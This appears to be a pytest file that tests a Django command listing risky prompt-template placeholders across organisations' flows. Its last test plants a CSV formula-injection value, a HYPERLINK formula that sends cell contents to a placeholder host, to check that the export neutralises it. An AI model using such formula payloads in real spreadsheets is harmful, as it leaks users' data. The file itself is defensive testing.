import csv
from io import StringIO

import pytest
from django.core.management import call_command
from django.utils import timezone

from tables.models import (
    AgentNode,
    AgentNodeTask,
    ClassificationDecisionTableNode,
    ClassificationDecisionTablePrompt,
    Graph,
    KnowledgeNode,
    TaskNode,
)
from tests.rbac_cross_org_fixtures import *  # noqa: F401,F403

HEADER = [
    "org_id",
    "org_name",
    "flow_id",
    "flow_name",
    "node_type",
    "node_id",
    "node_name",
    "field",
    "placeholder",
    "category",
    "reason",
]


def _bin(model, row):
    model.all_objects.filter(pk=row.pk).update(active=False, soft_deleted_at=timezone.now())


def _run_command():
    stdout, stderr = StringIO(), StringIO()
    call_command("inventory_flow_templates", stdout=stdout, stderr=stderr)
    header, *rows = csv.reader(StringIO(stdout.getvalue()))
    return header, rows, stderr.getvalue().splitlines()


@pytest.mark.django_db
def test_lists_the_placeholders_that_break_in_live_flows_of_every_org(acme, beta):
    acme_flow = Graph.objects.create(org=acme, name="Acme flow")
    refused_task = TaskNode.objects.create(
        graph=acme_flow, node_name="Refused task", instructions="Summarize {a._b}"
    )
    TaskNode.objects.create(
        graph=acme_flow, node_name="Clean task", instructions="Answer {context[user_input]}"
    )
    TaskNode.objects.create(
        graph=acme_flow, node_name="Example only", instructions='Reply like {"label": "x"}'
    )
    TaskNode.objects.create(
        graph=acme_flow, node_name="Unparsable example", instructions='Reply like {"a": 1} }'
    )
    TaskNode.objects.create(
        graph=acme_flow, node_name="Empty object only", instructions="Return {} if none"
    )
    empty_object = TaskNode.objects.create(
        graph=acme_flow,
        node_name="Empty object",
        instructions="Return {} if {context[user_input]} is empty",
    )
    unparsable = TaskNode.objects.create(
        graph=acme_flow, node_name="Unparsable", instructions="Answer {topic} }"
    )
    deleted_task = TaskNode.objects.create(
        graph=acme_flow, node_name="Deleted task", instructions="{a._b}"
    )
    _bin(TaskNode, deleted_task)
    search = KnowledgeNode.objects.create(
        graph=acme_flow, node_name="Search", query="Find {0} and {topic:>3}"
    )
    classifier = ClassificationDecisionTableNode.objects.create(
        graph=acme_flow, node_name="Classify"
    )
    ClassificationDecisionTablePrompt.objects.create(
        cdt_node=classifier,
        prompt_key="route",
        kind=ClassificationDecisionTablePrompt.Kind.LLM,
        prompt_text='Answer like {"label": "x"} for {context[user_input]}',
    )
    ClassificationDecisionTablePrompt.objects.create(
        cdt_node=classifier,
        prompt_key="fast",
        kind=ClassificationDecisionTablePrompt.Kind.SYSTEM_ONE,
        prompt_text="{x!r}",
    )
    deleted_classifier = ClassificationDecisionTableNode.objects.create(
        graph=acme_flow, node_name="Deleted classifier"
    )
    ClassificationDecisionTablePrompt.objects.create(
        cdt_node=deleted_classifier,
        prompt_key="ghost",
        kind=ClassificationDecisionTablePrompt.Kind.LLM,
        prompt_text="{a._b}",
    )
    _bin(ClassificationDecisionTableNode, deleted_classifier)

    beta_flow = Graph.objects.create(org=beta, name="Beta flow")
    writer = AgentNode.objects.create(graph=beta_flow, node_name="Writer")
    AgentNodeTask.objects.create(
        agent_node=writer, name="draft", order=0, instructions="Write about {x!r}"
    )
    deleted_agent = AgentNode.objects.create(graph=beta_flow, node_name="Deleted agent")
    AgentNodeTask.objects.create(agent_node=deleted_agent, name="ghost", order=0, instructions="{x!r}")
    _bin(AgentNode, deleted_agent)
    binned_flow = Graph.objects.create(org=beta, name="Binned flow")
    TaskNode.objects.create(graph=binned_flow, node_name="Binned task", instructions="{a._b}")
    _bin(Graph, binned_flow)

    header, rows, summary = _run_command()

    acme_columns = [str(acme.pk), "Acme-xorg", str(acme_flow.pk), "Acme flow"]
    beta_columns = [str(beta.pk), "Beta-xorg", str(beta_flow.pk), "Beta flow"]
    expected = [
        [*acme_columns, "TaskNode", str(refused_task.pk), "Refused task", "instructions", "{a._b}", "refused"],
        [*acme_columns, "TaskNode", str(unparsable.pk), "Unparsable", "instructions", "", "review"],
        [
            *acme_columns,
            "TaskNode",
            str(empty_object.pk),
            "Empty object",
            "instructions",
            "{context[user_input]}",
            "review",
        ],
        [*acme_columns, "KnowledgeNode", str(search.pk), "Search", "query", "{0}", "not rendered"],
        [*acme_columns, "KnowledgeNode", str(search.pk), "Search", "query", "{topic:>3}", "not rendered"],
        [
            *acme_columns,
            "ClassificationDecisionTableNode",
            str(classifier.pk),
            "Classify",
            "prompt_configs[route].prompt_text",
            "{context[user_input]}",
            "review",
        ],
        [*beta_columns, "AgentNode", str(writer.pk), "Writer", "tasks[draft].instructions", "{x!r}", "refused"],
    ]
    assert header == HEADER
    assert sorted(row[:-1] for row in rows) == sorted(expected)
    assert all(row[-1] for row in rows)
    reasons = {(row[5], row[8]): row[-1] for row in rows}
    assert reasons[(str(unparsable.pk), "")] == "Single '}' encountered in format string"
    assert reasons[(str(classifier.pk), "{context[user_input]}")].startswith(
        "Placeholder '{context[user_input]}' is not filled. "
    )
    assert summary == ["refused: 2", "not rendered: 2", "review: 3"]


@pytest.mark.django_db
def test_prints_only_the_header_when_no_template_breaks(acme):
    flow = Graph.objects.create(org=acme, name="Clean flow")
    TaskNode.objects.create(graph=flow, node_name="Clean", instructions="Answer {context[user_input]}")

    header, rows, summary = _run_command()

    assert header == HEADER
    assert rows == []
    assert summary == ["refused: 0", "not rendered: 0", "review: 0"]


@pytest.mark.django_db
def test_names_that_a_spreadsheet_would_run_as_a_formula_are_written_as_text(acme):
    flow = Graph.objects.create(org=acme, name='=HYPERLINK("https://example.invalid/?"&B2,"open")')
    TaskNode.objects.create(graph=flow, node_name="@SUM(A1:A9)", instructions="Find {0}")

    _, rows, _ = _run_command()

    assert [(row[3], row[6]) for row in rows] == [
        ('\'=HYPERLINK("https://example.invalid/?"&B2,"open")', "'@SUM(A1:A9)")
    ]
